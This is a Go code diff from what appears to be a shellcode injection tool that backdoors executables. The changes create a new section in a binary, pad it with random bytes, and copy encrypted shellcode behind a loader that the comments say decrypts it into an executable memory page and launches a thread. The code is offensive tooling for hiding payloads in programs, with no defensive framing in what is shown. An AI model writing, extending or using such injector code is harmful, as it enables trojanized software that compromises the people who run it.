@@ -28,10 +28,7 @@ const (
 	maxNumLoaderInstX64 = 250
 )
 
-const (
-	defaultSectionName = ".patch"
-	reservedLoaderSize = 4096
-)
+const reservedLoaderSize = 4096
 
 // The role of the shellcode loader is used to decrypt shellcode
 // in the tail section to a new RWX page, then create thread at
@@ -524,15 +521,16 @@ func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string)
 
 func (inj *Injector) useCreateSectionMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
 	shellcode := inj.encryptShellcode(ctx, sc)
-	name := inj.opts.SectionName
-	if name == "" {
-		name = defaultSectionName
-	}
-	section, err := inj.createSection(name, reservedLoaderSize+uint32(len(shellcode)))
+	size := reservedLoaderSize + uint32(len(shellcode))
+	section, err := inj.createSection(inj.opts.SectionName, size)
 	if err != nil {
 		return "", err
 	}
 	inj.section = section
+	// write random data for padding caves between loader and shellcode
+	inj.rand.Read(inj.dup[inj.section.Offset : inj.section.Offset+reservedLoaderSize])
+	// write encrypted shellcode
+	copy(inj.dup[section.Offset+reservedLoaderSize:], shellcode)
 	ctx.CreateSection = true
 	ctx.ShellcodeOffset = section.VirtualAddress + reservedLoaderSize
 	// remove the flag in assembly source
